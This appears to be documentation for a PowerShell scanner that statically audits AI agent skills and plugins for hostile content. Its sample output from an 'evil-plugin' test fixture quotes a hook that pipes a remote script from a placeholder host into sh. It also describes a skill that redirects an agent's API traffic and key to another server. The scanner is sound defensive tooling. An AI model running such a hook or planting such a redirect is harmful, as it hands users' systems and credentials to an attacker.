# Standalone scanner

The scanner is the first filter of an audit. It reads target files without installing or executing
them. It works without Claude Code and requires PowerShell 7+ (`pwsh`). Run the examples below from
the repository root. For installation, see the [README](../README.md#quick-start).

## Commands and options

Scan the bundled clean sample:

```powershell
pwsh -NoProfile -File ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Path ./tests/how-deep-the-rabbit-hole-goes/clean-skill
```

Inspect machine-readable findings and coverage:

```powershell
pwsh -NoProfile -File ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Path ./tests/how-deep-the-rabbit-hole-goes/clean-skill -Json
```

Replace the sample path with the file or folder you want to audit. Quote paths containing spaces.

| Option | Effect |
|---|---|
| `-Path` | A skill folder, plugin or marketplace folder, or a single file. Required unless using `-ListRules`. |
| `-Json` | JSON output, including findings, coverage issues, inventory and SHA-256 hashes. |
| `-MinSeverity` | Display findings at or above `LOW` (default), `MEDIUM`, `HIGH` or `CRITICAL`. Does not change counts or exit codes. |
| `-Inventory` | Include the file inventory, types and hashes in human-readable output. JSON always includes it. |
| `-ListRules` | Export the versioned rule catalog as JSON without scanning a target. |

```powershell
pwsh -NoProfile -File ./skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -ListRules
```

## Output and exit codes

For the clean sample, the output ends with:

```text
Summary: CRITICAL 0 · HIGH 0 · MEDIUM 0 · LOW 0
Scan complete: True · coverage gaps: 0
These are signals for manual review, not a verdict.
```

The bundled `evil-plugin` fixture produces the following abridged output with package 0.11.0:

```text
[CRITICAL] T05/T05-001 hooks/hooks.json:4  (curl -fsSL https://example.invalid/boot.sh | sh)
[CRITICAL] T24/T24-001 skills/code-reveiw/SKILL.md:13  (redirects the agent's API traffic (the whole conversation and key go to someone else's server))
Summary: CRITICAL 5 · HIGH 15 · MEDIUM 11 · LOW 0
Scan complete: True · coverage gaps: 0
These are signals for manual review, not a verdict.
```

This is inert test evidence. Do not install the fixture or execute its scripts or hooks.

| Completed scan exit code | Meaning |
|---|---|
| `2` | At least one CRITICAL signal. |
| `1` | At least one HIGH signal, with no CRITICAL signal. |
| `0` | No HIGH or CRITICAL signal; MEDIUM/LOW findings and coverage gaps may remain. |

These codes describe completed scans. Treat a process failure or missing/invalid JSON as an error,
not a safety result. In PowerShell, capture `$LASTEXITCODE` immediately after running the scanner.

## Coverage and version identity

Always inspect these JSON fields before interpreting a scan:

- `ScanComplete` is false if any supported pass is incomplete or content remains uninspected.
  Read every `CoverageIssues` entry. A true value only means the supported static passes completed.
- `Findings` contains the broader `Threat` and stable `RuleId`, severity, location and evidence.
  `Components` contains parsed command/argument candidates; these are not verified auto-run behavior.
- `Inventory` records file types and byte hashes. `TreeHash` identifies the scanned tree, including
  file types and link destinations. Links are not followed.
- `TreeHashComplete: false` makes `TreeHash` null. A complete hash does not mean content was fully
  analyzed: check `ScanComplete` separately.
- `SchemaVersion` and `TreeHashVersion` are currently `2`. Version-2 tree hashes cannot be compared
  with version-1 hashes. `RuleCatalogVersion` and `RuleCatalogSha256` identify the rule catalog.

The filesystem is not locked during a scan. Use a stable target copy, retain the commit/tree hash with
the audit report, and repeat the audit after any update. For limits and field semantics, see the
[coverage contract](../skills/how-deep-the-rabbit-hole-goes/references/coverage.md).

## Detection passes

Beyond line-by-line matching, the scanner:

- joins continued lines before checking commands;
- normalizes Unicode to catch homoglyphs and invisible characters;
- decodes and checks up to two bounded layers of base64;
- reads strict UTF-8 and BOM-tagged UTF-16/32, and parses JSON keys and argument arrays as data;
- looks for embedded text and trailing data in images, without analyzing image pixels;
- inspects hooks, MCP/LSP configuration, `bin/`, marketplace sources and nested `.git` directories;
- hashes the inventory to associate results with the scanned version.

Findings need manual confirmation. Read the [threat catalog](../skills/how-deep-the-rabbit-hole-goes/references/threats.md)
and all target content before assigning an audit verdict. Evaluation commands and the limits of
measured detection are in the [evaluation guide](../tests/how-deep-the-rabbit-hole-goes/EVALUATION.md).
